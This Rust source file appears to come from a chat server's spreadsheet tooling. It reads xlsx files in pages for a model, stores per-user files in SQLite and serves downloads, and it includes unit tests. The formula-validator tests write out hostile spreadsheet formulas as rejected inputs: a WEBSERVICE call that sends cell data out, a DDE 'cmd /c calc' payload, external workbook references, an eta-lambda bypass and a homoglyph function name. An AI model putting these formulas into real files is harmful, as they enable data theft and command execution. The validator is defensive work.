            } else {
                Some(cell)
            };
            if let Some(Value::String(text)) = formula {
                f(text);
            }
        }
    }
}

/// Nama sheet seperti ditulis di rumus: tanpa kutip kalau hanya huruf, angka, dan `_`.
fn sheet_ref(name: &str) -> String {
    let plain = name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        && name
            .chars()
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
    if plain {
        name.to_string()
    } else {
        format!("'{}'", name.replace('\'', "''"))
    }
}

/// Mengganti rujukan ke sheet `old` (`Data!`, `'Data Lama'!`) dengan `replacement`.
/// Teks dalam kutip ganda dibiarkan apa adanya.
fn replace_sheet_ref(formula: &str, old: &str, replacement: &str) -> String {
    let chars: Vec<char> = formula.chars().collect();
    let mut out = String::with_capacity(formula.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        if c == '"' {
            let start = i;
            i += 1;
            while i < chars.len() {
                if chars[i] == '"' {
                    if chars.get(i + 1) == Some(&'"') {
                        i += 2;
                        continue;
                    }
                    i += 1;
                    break;
                }
                i += 1;
            }
            out.extend(&chars[start..i]);
        } else if c == '\'' {
            let start = i;
            let mut name = String::new();
            i += 1;
            while i < chars.len() {
                if chars[i] == '\'' {
                    if chars.get(i + 1) == Some(&'\'') {
                        name.push('\'');
                        i += 2;
                        continue;
                    }
                    i += 1;
                    break;
                }
                name.push(chars[i]);
                i += 1;
            }
            if chars.get(i) == Some(&'!') && same_sheet(&name, old) {
                out.push_str(replacement);
            } else {
                out.extend(&chars[start..i]);
            }
        } else if c.is_ascii_alphabetic() || c == '_' {
            let start = i;
            while i < chars.len() && (chars[i].is_ascii_alphanumeric() || "_.".contains(chars[i])) {
                i += 1;
            }
            let word: String = chars[start..i].iter().collect();
            // Rentang sheet tanpa kutip, misalnya Jan:Mar!A2: kedua ujungnya diperiksa.
            if chars.get(i) == Some(&':') {
                let second_start = i + 1;
                let mut j = second_start;
                while j < chars.len() && (chars[j].is_ascii_alphanumeric() || chars[j] == '_') {
                    j += 1;
                }
                if j > second_start && chars.get(j) == Some(&'!') {
                    let second: String = chars[second_start..j].iter().collect();
                    for (n, name) in [word.as_str(), second.as_str()].into_iter().enumerate() {
                        if n == 1 {
                            out.push(':');
                        }
                        out.push_str(if same_sheet(name, old) {
                            replacement
                        } else {
                            name
                        });
                    }
                    i = j;
                    continue;
                }
            }
            if chars.get(i) == Some(&'!') && same_sheet(&word, old) {
                out.push_str(replacement);
            } else {
                out.push_str(&word);
            }
        } else {
            out.push(c);
            i += 1;
        }
    }
    out
}

/// Apakah rumus memakai sheet `name` sebagai ujung rentang sheet (Jan:Mar!A2).
fn used_in_sheet_range(formula: &str, name: &str) -> bool {
    let probe = replace_sheet_ref(formula, name, "\u{1}");
    probe.contains("\u{1}:") || probe.contains(":\u{1}")
}

/// Isi file untuk model dalam batas `budget` karakter: ringkasan sheet (kolom dengan hurufnya
/// dan jumlah baris), lalu baris sheet yang diminta mulai `from_row`, masing-masing dengan
/// nomor baris Excel. Ringkasan dipadatkan kalau besar, dan halaman selalu maju walau satu
/// baris lebih besar dari anggaran (isi sel panjang dipotong dan ditandai).
pub fn read_page(spec: &XlsxSpec, sheet: Option<&str>, from_row: usize, budget: usize) -> Value {
    let target_index = sheet
        .and_then(|name| spec.sheets.iter().position(|s| same_sheet(&s.name, name)))
        .unwrap_or(0);
    let columns_of = |s: &SheetSpec| -> Vec<Value> {
        s.columns
            .iter()
            .enumerate()
            .map(|(i, c)| {
                let mut column =
                    json!({ "col": column_letter(i), "header": c.header, "format": c.format });
                if let Some(formula) = &c.header_formula {
                    column["rumus_header"] = formula["formula"].clone();
                }
                column
            })
            .collect()
    };
    let full: Vec<Value> = spec
        .sheets
        .iter()
        .map(|s| json!({ "name": s.name, "columns": columns_of(s), "data_rows": s.rows.len() }))
        .collect();
    let mut out = json!({ "filename": spec.filename, "sheets": full });
    if out.to_string().len() > budget / 4 {
        // Ringkasan besar: kolom hanya untuk sheet yang dibaca, sheet lain cukup nama dan jumlah baris.
        let compact: Vec<Value> = spec
            .sheets
            .iter()
            .enumerate()
            .map(|(i, s)| {
                let mut item = json!({ "name": s.name, "data_rows": s.rows.len() });
                if i == target_index {
                    item["columns"] = json!(columns_of(s));
                }
                item
            })
            .collect();
        out["sheets"] = json!(compact);
    }
    if out.to_string().len() > budget / 2 {
        let names: Vec<Value> = spec
            .sheets
            .iter()
            .take(50)
            .map(|s| json!({ "name": s.name, "data_rows": s.rows.len() }))
            .collect();
        out["sheets"] = json!(names);
    }
    let Some(target) = spec.sheets.get(target_index) else {
        return out;
    };
    let start = from_row.max(2) - 2;
    let mut used = out.to_string().len() + 300;
    let mut rows = Vec::new();
    let mut next = None;
    for (i, cells) in target.rows.iter().enumerate().skip(start) {
        let item = json!({ "row": i + 2, "values": cells });
        let size = item.to_string().len();
        if used + size > budget {
            if rows.is_empty() {
                // Satu baris saja sudah melebihi anggaran: kirim versi terpotong supaya tetap maju.
                let per_cell = budget.saturating_sub(used) / (cells.len().max(1) * 2);
                rows.push(json!({ "row": i + 2, "values": shrink_cells(cells, per_cell), "dipotong": true }));
                next = (i + 1 < target.rows.len()).then_some(i + 3);
            } else {
                next = Some(i + 2);
            }
            break;
        }
        used += size;
        rows.push(item);
    }
    out["sheet"] = json!(target.name);
    fit_page(out, rows, next, budget)
}

/// Menyusun halaman dan memastikan JSON akhirnya benar-benar muat di `budget`. Baris terakhir
/// dipindah ke halaman berikutnya sampai muat; satu baris yang tetap tidak muat dilewati
/// (dicatat), supaya pembacaan selalu maju.
fn fit_page(base: Value, mut rows: Vec<Value>, mut next: Option<usize>, budget: usize) -> Value {
    let mut skipped = None;
    loop {
        let mut page = base.clone();
        page["rows"] = json!(rows);
        if let Some(row) = skipped {
            page["dilewati"] = json!(format!(
                "Baris {row} terlalu besar untuk dibaca dan dilewati."
            ));
        }
        if let Some(next) = next {
            page["next_from_row"] = json!(next);
            page["catatan"] = json!(
                "Masih ada baris lain. Panggil read_xlsx lagi dengan from_row untuk melanjutkan, atau ubah file dengan edit_xlsx tanpa membaca semuanya."
            );
        }
        if page.to_string().len() <= budget || rows.is_empty() {
            return page;
        }
        // Tinggal satu baris utuh yang tidak muat: potong dulu isi selnya sebelum menyerah.
        if rows.len() == 1 && rows[0].get("dipotong").is_none() {
            let row = rows[0]["row"].clone();
            let cells = rows[0]["values"].as_array().cloned().unwrap_or_default();
            let per_cell = budget / (cells.len().max(1) * 3);
            rows[0] =
                json!({ "row": row, "values": shrink_cells(&cells, per_cell), "dipotong": true });
            continue;
        }
        let last = rows.pop().unwrap_or_default();
        let row = last["row"].as_u64().unwrap_or(0) as usize;
        if rows.is_empty() {
            skipped = Some(row);
            next = next.max(Some(row + 1));
        } else {
            next = Some(row);
        }
    }
}

/// Isi sel teks yang panjang dipotong ke `per_cell` karakter (minimal 20), dengan keterangan
/// panjang aslinya.
fn shrink_cells(cells: &[Value], per_cell: usize) -> Vec<Value> {
    let shrink = |value: &Value, limit| match value {
        Value::String(s) if s.chars().count() > limit => {
            let head: String = s.chars().take(limit).collect();
            json!(format!(
                "{head}… (dipotong, aslinya {} karakter)",
                s.chars().count()
            ))
        }
        other => other.clone(),
    };
    let limit = per_cell.clamp(20, 2_000);
    cells
        .iter()
        .map(|value| {
            if stored_formula(value).is_some() {
                json!({ "formula": shrink(&value["formula"], limit / 2),
                    "value": shrink(&value["value"], limit / 2) })
            } else {
                shrink(value, limit)
            }
        })
        .collect()
}

// ---------- penyimpanan ----------

/// Tempat menyimpan file buatan tool.
#[derive(Clone)]
pub enum FileStore {
    /// File milik user di percakapan tertentu (chat).
    User {
        db: Db,
        dir: PathBuf,
        user_id: i64,
        conversation_id: String,
    },
    /// Hanya ke folder lokal, untuk `rag-hub-server tanya`.
    Local { dir: PathBuf },
}

pub(crate) fn new_id() -> String {
    hex::encode(rand::random::<[u8; 16]>())
}

impl FileStore {
    /// Isi terstruktur file milik user di percakapan ini. File user lain atau percakapan
    /// lain tidak bisa dibaca, walau id-nya diketahui.
    #[cfg(test)]
    pub async fn load_spec(&self, id: &str) -> Option<Value> {
        self.load(id).await.map(|(_, spec)| spec)
    }

    /// Jenis file (`xlsx`, `docx`) dan isi terstrukturnya, dengan batasan yang sama.
    pub async fn load(&self, id: &str) -> Option<(String, Value)> {
        let FileStore::User {
            db,
            user_id,
            conversation_id,
            ..
        } = self
        else {
            return None;
        };
        if !valid_id(id) {
            return None;
        }
        let (id, user_id, conversation_id) = (id.to_string(), *user_id, conversation_id.clone());
        let row: Option<(String, String)> = db
            .call(move |c| {
                use rusqlite::OptionalExtension;
                Ok(c.query_row(
                    "SELECT kind, spec FROM files WHERE id = ?1 AND user_id = ?2 AND conversation_id = ?3",
                    rusqlite::params![id, user_id, conversation_id],
                    |r| Ok((r.get(0)?, r.get(1)?)),
                )
                .optional()?)
            })
            .await
            .ok()
            .flatten();
        let (kind, spec) = row?;
        Some((kind, serde_json::from_str(&spec).ok()?))
    }

    pub async fn load_for_excel_tools(&self, id: &str) -> Result<(String, Value), String> {
        let (kind, mut spec) = self
            .load(id)
            .await
            .ok_or("File tidak ditemukan di percakapan ini. Pakai id file dari riwayat.")?;
        let old_xlsx = kind == "xlsx" && spec.get("teks_rumus").is_none();
        let old_xls = kind == "xls"
            && spec["teks_rumus"]
                .as_str()
                .is_some_and(|text| !text.is_empty());
        if spec["lampiran"] == true && (old_xlsx || old_xls) {
            // Perbarui hasil baca lampiran yang disimpan sebelum penanganan rumus berubah.
            let FileStore::User { dir, user_id, .. } = self else {
                unreachable!()
            };
            let bytes = tokio::fs::read(path_of(dir, *user_id, id, &kind))
                .await
                .map_err(|_| "File asli lampiran tidak bisa dibuka. Lampirkan ulang filenya.")?;
            let name = spec["filename"].as_str().unwrap_or("Excel");
            let excel_kind = if old_xls { "xls" } else { "xlsx" };
            spec = crate::attachments::read_content(excel_kind, name, &bytes).await?;
        }
        Ok((kind, spec))
    }

    pub async fn save(
        &self,
        name: &str,
        kind: &str,
        bytes: Vec<u8>,
        spec: &Value,
    ) -> anyhow::Result<FileRef> {
        let display = format!("{}.{kind}", safe_name(name));
        match self {
            FileStore::User {
                db,
                dir,
                user_id,
                conversation_id,
            } => {
                let owner = Owner {
                    user_id: *user_id,
                    conversation_id: Some(conversation_id.clone()),
                };
                store_file(db, dir, owner, display, kind, bytes, spec).await
            }
            FileStore::Local { dir } => {
                let size = bytes.len() as i64;
                tokio::fs::create_dir_all(dir).await?;
                tokio::fs::write(dir.join(&display), &bytes).await?;
                Ok(FileRef {
                    id: new_id(),
                    name: display,
                    kind: kind.to_string(),
                    size,
                })
            }
        }
    }
}

/// Pemilik file. Lampiran yang belum dikirim belum punya percakapan.
pub struct Owner {
    pub user_id: i64,
    pub conversation_id: Option<String>,
}

/// Menulis file ke `dir/<user>/<id>.<kind>` dan mencatatnya di tabel `files`.
pub async fn store_file(
    db: &Db,
    dir: &std::path::Path,
    owner: Owner,
    display: String,
    kind: &str,
    bytes: Vec<u8>,
    spec: &Value,
) -> anyhow::Result<FileRef> {
    let id = new_id();
    let size = bytes.len() as i64;
    let path = path_of(dir, owner.user_id, &id, kind);
    if let Some(parent) = path.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }
    tokio::fs::write(&path, &bytes).await?;
    let row = (
        id.clone(),
        display.clone(),
        kind.to_string(),
        spec.to_string(),
    );
    let saved = db
        .call(move |c| {
            let (id, name, kind, spec) = row;
            c.execute(
                "INSERT INTO files (id, user_id, conversation_id, name, kind, size, spec, created_at)
                 VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                rusqlite::params![id, owner.user_id, owner.conversation_id, name, kind, size, spec, crate::db::now()],
            )?;
            Ok(())
        })
        .await;
    if let Err(e) = saved {
        let _ = tokio::fs::remove_file(&path).await;
        return Err(e);
    }
    Ok(FileRef {
        id,
        name: display,
        kind: kind.to_string(),
        size,
    })
}

/// Memesan satu tempat lampiran yang belum dikirim untuk `user_id`, kalau jumlahnya masih di
/// bawah `max`. Hitung dan pesan dalam satu transaksi tulis (`BEGIN IMMEDIATE`), jadi atomik
/// juga antar dua proses server. Baris pesanan (nama dan jenis kosong) diisi `fill_reserved`
/// atau dihapus `release_reserved`; yang tertinggal (proses mati) ikut dibersihkan sebagai
/// file yatim.
///
/// `abandoned`: pemanggilnya sudah pergi (request batal). Dicek di dalam transaksi, jadi
/// pesanan tidak pernah dibuat setelah pelepasnya (`release_reserved`) berjalan.
pub async fn reserve_pending(
    db: &Db,
    user_id: i64,
    max: i64,
    id: String,
    abandoned: Arc<AtomicBool>,
) -> anyhow::Result<bool> {
    db.call(move |c| {
        if abandoned.load(Ordering::SeqCst) {
            return Ok(false);
        }
        let tx = c.transaction_with_behavior(rusqlite::TransactionBehavior::Immediate)?;
        let pending: i64 = tx.query_row(
            "SELECT count(*) FROM files
             WHERE user_id = ?1 AND conversation_id IS NULL AND message_id IS NULL",
            [user_id],
            |r| r.get(0),
        )?;
        if pending >= max {
            return Ok(false);
        }
        tx.execute(
            "INSERT INTO files (id, user_id, conversation_id, name, kind, size, spec, created_at)
             VALUES (?1, ?2, NULL, '', '', 0, '{}', ?3)",
            rusqlite::params![id, user_id, crate::db::now()],
        )?;
        tx.commit()?;
        Ok(true)
    })
    .await
}

/// Mengisi pesanan `reserve_pending` dengan file yang sudah diperiksa. File ditulis dulu ke
/// disk; kalau pesanannya sudah tidak ada (dibersihkan) atau pemanggilnya sudah pergi
/// (`abandoned`, dicek di dalam perintah database), file dihapus lagi. Pemanggil menjalankan
/// fungsi ini sebagai task sendiri, supaya file dan barisnya tidak berhenti setengah jalan.
#[allow(clippy::too_many_arguments)]
pub async fn fill_reserved(
    db: &Db,
    dir: &std::path::Path,
    user_id: i64,
    id: &str,
    display: String,
    kind: &str,
    bytes: Vec<u8>,
    spec: &Value,
    abandoned: Arc<AtomicBool>,
) -> anyhow::Result<FileRef> {
    let size = bytes.len() as i64;
    let path = path_of(dir, user_id, id, kind);
    if let Some(parent) = path.parent() {
        tokio::fs::create_dir_all(parent).await?;
    }
    // Tulis gagal di tengah (disk penuh) bisa meninggalkan file setengah jadi tanpa baris.
    if let Err(e) = tokio::fs::write(&path, &bytes).await {
        let _ = tokio::fs::remove_file(&path).await;
        return Err(e.into());
    }
    let row = (
        id.to_string(),
        display.clone(),
        kind.to_string(),
        spec.to_string(),
    );
    let saved = db
        .call(move |c| {
            let (id, name, kind, spec) = row;
            if abandoned.load(Ordering::SeqCst) {
                return Ok(0);
            }
            Ok(c.execute(
                "UPDATE files SET name = ?3, kind = ?4, size = ?5, spec = ?6, created_at = ?7
                 WHERE id = ?1 AND user_id = ?2 AND kind = ''
                   AND conversation_id IS NULL AND message_id IS NULL",
                rusqlite::params![id, user_id, name, kind, size, spec, crate::db::now()],
            )?)
        })
        .await;
    match saved {
        Ok(1) => Ok(FileRef {
            id: id.to_string(),
            name: display,
            kind: kind.to_string(),
            size,
        }),
        Ok(_) => {
            let _ = tokio::fs::remove_file(&path).await;
            anyhow::bail!("pesanan lampiran sudah tidak ada")
        }
        Err(e) => {
            let _ = tokio::fs::remove_file(&path).await;
            Err(e)
        }
    }
}

/// Melepas pesanan unggahan yang gagal, ditolak, atau dibatalkan: barisnya dihapus selama
/// belum terkirim, juga kalau sudah terisi (request batal sesudah file tersimpan, sehingga id-nya
/// tidak pernah sampai ke user), beserta filenya.
pub async fn release_reserved(db: &Db, dir: &std::path::Path, user_id: i64, id: &str) {
    let key = id.to_string();
    let kind: Option<String> = db
        .call(move |c| {
            use rusqlite::OptionalExtension;
            Ok(c.query_row(
                "DELETE FROM files WHERE id = ?1 AND user_id = ?2
                   AND conversation_id IS NULL AND message_id IS NULL
                 RETURNING kind",
                rusqlite::params![key, user_id],
                |r| r.get(0),
            )
            .optional()?)
        })
        .await
        .ok()
        .flatten();
    if let Some(kind) = kind.filter(|k| !k.is_empty()) {
        let _ = tokio::fs::remove_file(path_of(dir, user_id, id, &kind)).await;
    }
}

/// File yang tidak pernah tertaut ke pesan dibersihkan setelah berumur sehari: file buatan
/// Bakase yang jawabannya gagal disimpan, dan lampiran yang diunggah tapi tidak dikirim.
pub async fn cleanup_orphans(db: Db, dir: PathBuf) {
    let cutoff = crate::db::now() - 24 * 60 * 60;
    let result = db
        .call(move |c| {
            // Hanya file yang barisnya benar-benar terhapus yang dihapus dari disk: proses
            // server lain (saat deploy) bisa menautkan lampiran lama di antara dua perintah.
            let mut stmt = c.prepare(
                "DELETE FROM files WHERE message_id IS NULL AND created_at < ?1
                 RETURNING id, user_id, kind",
            )?;
            let rows = stmt
                .query_map([cutoff], |r| {
                    Ok((
                        r.get::<_, String>(0)?,
                        r.get::<_, i64>(1)?,
                        r.get::<_, String>(2)?,
                    ))
                })?
                .collect::<Result<Vec<_>, _>>()?;
            Ok(rows)
        })
        .await;
    match result {
        Ok(rows) => {
            for (id, user_id, kind) in &rows {
                let _ = tokio::fs::remove_file(path_of(&dir, *user_id, id, kind)).await;
            }
            if !rows.is_empty() {
                tracing::info!("{} file yatim dibersihkan", rows.len());
            }
        }
        Err(e) => tracing::warn!("gagal membersihkan file yatim: {e:#}"),
    }
}

/// Path file di disk. `id` sudah dipastikan berasal dari baris milik user.
pub fn path_of(dir: &std::path::Path, user_id: i64, id: &str, kind: &str) -> PathBuf {
    dir.join(user_id.to_string()).join(format!("{id}.{kind}"))
}

pub fn valid_id(id: &str) -> bool {
    id.len() == 32 && id.bytes().all(|b| b.is_ascii_hexdigit())
}

/// MIME untuk unduhan menurut jenis file.
pub fn mime_of(kind: &str) -> &'static str {
    match kind {
        "xlsx" => XLSX_MIME,
        "docx" => crate::docx::DOCX_MIME,
        "xls" => "application/vnd.ms-excel",
        "pptx" => "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        "pdf" => "application/pdf",
        "csv" => "text/csv; charset=utf-8",
        "txt" | "md" => "text/plain; charset=utf-8",
        other => crate::ingest::vision_image_mime(other).unwrap_or("application/octet-stream"),
    }
}

fn not_found() -> ApiError {
    ApiError::not_found("File tidak ditemukan.")
}

/// `filename*` menurut RFC 5987, supaya nama berhuruf non-ASCII tetap benar.
pub(crate) fn content_disposition(name: &str) -> String {
    format!("attachment; {}", filename_parameters(name))
}

pub(crate) fn filename_parameters(name: &str) -> String {
    let ascii: String = name
        .chars()
        .map(|c| {
            if c.is_ascii() && c != '"' && c != '\\' && !c.is_control() {
                c
            } else {
                '_'
            }
        })
        .collect();
    let encoded: String = name
        .bytes()
        .map(|b| {
            if b.is_ascii_alphanumeric() || b"-._~".contains(&b) {
                (b as char).to_string()
            } else {
                format!("%{b:02X}")
            }
        })
        .collect();
    format!("filename=\"{ascii}\"; filename*=UTF-8''{encoded}")
}

async fn owned_file(
    state: &AppState,
    user_id: i64,
    id: String,
) -> Result<(String, String, String), ApiError> {
    if !valid_id(&id) {
        return Err(not_found());
    }
    let row = state
        .db
        .call(move |c| {
            use rusqlite::OptionalExtension;
            Ok(c.query_row(
                "SELECT name, kind, spec FROM files WHERE id = ?1 AND user_id = ?2",
                rusqlite::params![id, user_id],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)),
            )
            .optional()?)
        })
        .await?;
    row.ok_or_else(not_found)
}

pub async fn download(
    State(state): State<Arc<AppState>>,
    user: AuthUser,
    Path(id): Path<String>,
) -> Result<Response, ApiError> {
    let (name, kind, _) = owned_file(&state, user.id, id.clone()).await?;
    let bytes = tokio::fs::read(path_of(&state.files_dir, user.id, &id, &kind))
        .await
        .map_err(|_| not_found())?;
    // Lampiran berasal dari user: browser tidak boleh menebak jenisnya atau menjalankannya
    // sebagai halaman. Gambar tetap tampil di <img> walau disposisinya attachment.
    Ok((
        [
            (header::CONTENT_TYPE, mime_of(&kind).to_string()),
            (header::CONTENT_DISPOSITION, content_disposition(&name)),
            (header::CACHE_CONTROL, "private, no-store".to_string()),
            (header::X_CONTENT_TYPE_OPTIONS, "nosniff".to_string()),
            (
                header::CONTENT_SECURITY_POLICY,
                "default-src 'none'; sandbox".to_string(),
            ),
        ],
        bytes,
    )
        .into_response())
}

pub async fn preview(
    State(state): State<Arc<AppState>>,
    user: AuthUser,
    Path(id): Path<String>,
) -> Result<Json<Value>, ApiError> {
    let (name, kind, spec) = owned_file(&state, user.id, id).await?;
    let mut spec: Value = serde_json::from_str(&spec).unwrap_or(Value::Null);
    if kind == "pptx" && spec["lampiran"] != true {
        crate::pptx::format_preview_table_numbers(&mut spec);
    }
    if spec["diedit"] == true
        && let Ok(mut xlsx) = serde_json::from_value::<XlsxSpec>(spec.clone())
    {
        show_pending_recalculation(&mut xlsx);
        spec["sheets"] = json!(xlsx.sheets);
    }
    if let Some(object) = spec.as_object_mut() {
        object.remove("teks_rumus");
    }
    if let Some(sheets) = spec["sheets"].as_array_mut() {
        for sheet in sheets {
            if let Some(columns) = sheet["columns"].as_array_mut() {
                for column in columns.iter_mut().filter_map(Value::as_object_mut) {
                    column.remove("header_formula");
                }
            }
            if let Some(rows) = sheet["rows"].as_array_mut() {
                for cell in rows.iter_mut().filter_map(Value::as_array_mut).flatten() {
                    if stored_formula(cell).is_some() {
                        *cell = cell["value"].take();
                    }
                }
            }
        }
    }
    Ok(Json(json!({ "name": name, "kind": kind, "spec": spec })))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec(rows: Vec<Vec<Value>>) -> XlsxSpec {
        serde_json::from_value(json!({
            "filename": "Rekap",
            "sheets": [{ "name": "Data", "columns": [
                { "header": "Nama" }, { "header": "Jam", "format": "angka" }, { "header": "Tanggal", "format": "tanggal" }
            ], "rows": rows }]
        }))
        .unwrap()
    }

    #[test]
    fn builds_xlsx_with_formula_and_date() {
        let bytes = build_xlsx(&spec(vec![
            vec![json!("Alex"), json!(12), json!("2026-11-16")],
            vec![json!("Total"), json!("=SUM(B2:B2)"), Value::Null],
        ]))
        .unwrap();
        assert!(bytes.starts_with(b"PK"), "xlsx adalah file zip");
    }

    #[test]
    fn validation_messages_help_the_model() {
        let too_wide = spec(vec![vec![json!(1), json!(2), json!(3), json!(4)]]);
        assert!(validate_xlsx(&too_wide).unwrap_err().contains("Baris 2"));
        let mut bad_name = spec(vec![]);
        bad_name.sheets[0].name = "Data/2026".into();
        assert!(
            validate_xlsx(&bad_name)
                .unwrap_err()
                .contains("tidak boleh")
        );
        let empty: XlsxSpec =
            serde_json::from_value(json!({ "filename": "x", "sheets": [] })).unwrap();
        assert!(validate_xlsx(&empty).is_err());
    }

    #[test]
    fn formulas_are_limited_to_safe_functions() {
        assert!(check_formula("=SUM(B2:B10)").is_ok());
        assert!(check_formula("=IF(A2>0,\"Lulus (ok)\",\"\")").is_ok());
        assert!(check_formula("='Minggu 1'!B2+Data!C3").is_ok());
        assert!(check_formula("=xlookup(A2,B:B,C:C)").is_ok());
        assert!(check_formula("=_xlfn.XLOOKUP(A2,B:B,C:C)").is_ok());
        let err = check_formula("=WEBSERVICE(\"http://x/?\"&A1)").unwrap_err();
        assert!(err.contains("WEBSERVICE"));
        assert!(check_formula("=HYPERLINK(\"http://x\",\"klik\")").is_err());
        assert!(check_formula("=INDIRECT(\"A1\")").is_err());
        assert!(check_formula("=cmd|' /c calc'!A0").is_err());
        assert!(check_formula("=[Gaji.xlsx]Sheet1!A1").is_err());
        assert!(check_formula("='C:\\data\\[Gaji.xlsx]Sheet1'!A1").is_err());
        // Fungsi sebagai nilai (eta lambda) dan memanggil hasil ekspresi.
        assert!(check_formula("=IF(TRUE,_xleta.WEBSERVICE,0)(\"https://x/\")").is_err());
        assert!(check_formula("=IF(TRUE,SUM,0) (A1)").is_err());
        assert!(check_formula("=_xlws.FILTER(A:A,B:B)").is_err());
        assert!(check_formula("=_xlfn._xlws.SORT(A:A)").is_err());
        assert!(
            check_formula("=SUMА(A1)").is_err(),
            "huruf Kiril yang mirip A"
        );
        assert!(check_formula("=ROUND(SUM(B2:B5)/COUNT(B2:B5),2)").is_ok());
    }

    fn sample(rows: usize) -> XlsxSpec {
        let rows: Vec<Value> = (0..rows)
            .map(|i| json!([format!("Orang {i}"), i]))
            .collect();
        serde_json::from_value(json!({ "filename": "Rekap", "sheets": [{ "name": "Data",
            "columns": [{ "header": "Nama" }, { "header": "Jam", "format": "angka" }],
            "rows": rows }] }))
        .unwrap()
    }

    fn ops(value: Value) -> Vec<EditOp> {
        serde_json::from_value(value).unwrap()
    }

    #[test]
    fn edits_apply_to_the_full_spec() {
        let (spec, _) = apply_edits(
            sample(600),
            &ops(json!([
                { "op": "set_cell", "sheet": "data", "cell": "B1", "value": "Jam lembur" },
                { "op": "set_cell", "sheet": "Data", "cell": "B500", "value": 7 },
                { "op": "insert_rows", "sheet": "Data", "before_row": 2, "rows": [["Baru", 1]] },
                { "op": "delete_rows", "sheet": "Data", "from_row": 3, "count": 2 },
                { "op": "add_column", "sheet": "Data", "header": "Catatan", "values": ["a"] },
                { "op": "add_sheet", "name": "Ringkasan", "columns": [{ "header": "Total" }], "rows": [["=SUM(Data!B2:B600)"]] },
                { "op": "rename_sheet", "sheet": "Ringkasan", "new_name": "Total" }
            ])),
        )
        .unwrap();
        let data = &spec.sheets[0];
        assert_eq!(data.columns[1].header, "Jam lembur");
        assert_eq!(data.rows.len(), 599, "600 + 1 sisipan - 2 hapus");
        assert_eq!(data.rows[0], vec![json!("Baru"), json!(1), json!("a")]);
        // B500 (indeks 498) bergeser +1 karena sisipan, lalu -2 karena hapus di atasnya.
        assert_eq!(data.rows[497][1], json!(7));
        assert_eq!(
            data.rows[598][0],
            json!("Orang 599"),
            "baris terakhir tetap ada"
        );
        assert_eq!(spec.sheets[1].name, "Total");
        assert!(build_xlsx(&spec).is_ok());
    }

    #[test]
    fn renaming_a_sheet_updates_formulas_and_deleting_a_referenced_one_is_refused() {
        let spec: XlsxSpec = serde_json::from_value(json!({ "filename": "x", "sheets": [
            { "name": "Data", "columns": [{ "header": "Jam" }], "rows": [[1], [2]] },
            { "name": "Total", "columns": [{ "header": "Total" }, { "header": "Catatan", "format": "teks" }],
              "rows": [["=SUM(Data!A2:A3)+'Data'!A2", "=Data!A2 tetap teks"], ["=\"Data!A2\"&Data!A2", null]] }
        ]}))
        .unwrap();
        let (renamed, _) = apply_edits(
            spec.clone(),
            &ops(
                json!([{ "op": "rename_sheet", "sheet": "Data", "new_name": "Operasional 2026" }]),
            ),
        )
        .unwrap();
        let total = &renamed.sheets[1].rows;
        assert_eq!(
            total[0][0],
            "=SUM('Operasional 2026'!A2:A3)+'Operasional 2026'!A2"
        );
        assert_eq!(
            total[0][1], "=Data!A2 tetap teks",
            "kolom teks tidak disentuh"
        );
        assert_eq!(
            total[1][0], "=\"Data!A2\"&'Operasional 2026'!A2",
            "teks berkutip tidak disentuh"
        );
        assert!(build_xlsx(&renamed).is_ok());

        let err = apply_edits(
            spec,
            &ops(json!([{ "op": "delete_sheet", "sheet": "Data" }])),
        )
        .unwrap_err();
        assert!(err.contains("masih merujuk"));
    }

    #[test]
    fn huge_counts_and_huge_rows_do_not_break_editing_or_reading() {
        let err = apply_edits(
            sample(3),
            &ops(
                json!([{ "op": "delete_rows", "sheet": "Data", "from_row": 3, "count": u64::MAX }]),
            ),
        )
        .unwrap_err();
        assert!(err.contains("tidak ada"));
        // Satu baris dengan sel raksasa tetap terbaca (dipotong) dan halaman maju.
        let mut spec = sample(3);
        spec.sheets[0].rows[0] = vec![json!("x".repeat(50_000)), json!(1)];
        let page = read_page(&spec, None, 2, 5_000);
        assert_eq!(page["rows"][0]["dipotong"], true);
        assert_eq!(page["next_from_row"], 3);
        assert!(page.to_string().len() < 8_000);
        // Ringkasan banyak sheet lebar dipadatkan.
        let wide: Vec<Value> = (0..60)
            .map(|i| json!({ "header": format!("Kolom panjang nomor {i}") }))
            .collect();
        let sheets: Vec<Value> = (0..12)
            .map(|i| json!({ "name": format!("S{i}"), "columns": wide, "rows": [] }))
            .collect();
        let many: XlsxSpec =
            serde_json::from_value(json!({ "filename": "x", "sheets": sheets })).unwrap();
        assert!(read_page(&many, None, 2, 20_000).to_string().len() < 20_000);
    }

    #[test]
    fn sheet_ranges_follow_renames_and_block_deletes() {
        let spec: XlsxSpec = serde_json::from_value(json!({ "filename": "x", "sheets": [
            { "name": "Jan", "columns": [{ "header": "A" }], "rows": [[1]] },
            { "name": "Feb", "columns": [{ "header": "A" }], "rows": [[2]] },
            { "name": "Mar", "columns": [{ "header": "A" }], "rows": [[3]] },
            { "name": "Total", "columns": [{ "header": "Total" }], "rows": [["=SUM(Jan:Mar!A2)"]] }
        ]}))
        .unwrap();
        let (renamed, _) = apply_edits(
            spec.clone(),
            &ops(json!([{ "op": "rename_sheet", "sheet": "Jan", "new_name": "Januari" }])),
        )
        .unwrap();
        assert_eq!(renamed.sheets[3].rows[0][0], "=SUM(Januari:Mar!A2)");
        assert!(build_xlsx(&renamed).is_ok());
        let err = apply_edits(
            spec.clone(),
            &ops(json!([{ "op": "rename_sheet", "sheet": "Mar", "new_name": "Maret 2026" }])),
        )
        .unwrap_err();
        assert!(err.contains("rentang sheet"));
        let err = apply_edits(
            spec,
            &ops(json!([{ "op": "delete_sheet", "sheet": "Jan" }])),
        )
        .unwrap_err();
        assert!(err.contains("masih merujuk"));
    }

    #[test]
    fn pages_always_fit_the_budget_and_move_forward() {
        // Tiga baris, masing-masing 20 sel teks 2.000 karakter.
        let wide: Vec<Value> = (0..20)
            .map(|i| json!({ "header": format!("K{i}") }))
            .collect();
        let big_row: Vec<Value> = (0..20).map(|_| json!("x".repeat(2_000))).collect();
        let spec: XlsxSpec = serde_json::from_value(json!({ "filename": "x", "sheets": [
            { "name": "Data", "columns": wide, "rows": [big_row.clone(), big_row.clone(), big_row] }
        ]}))
        .unwrap();
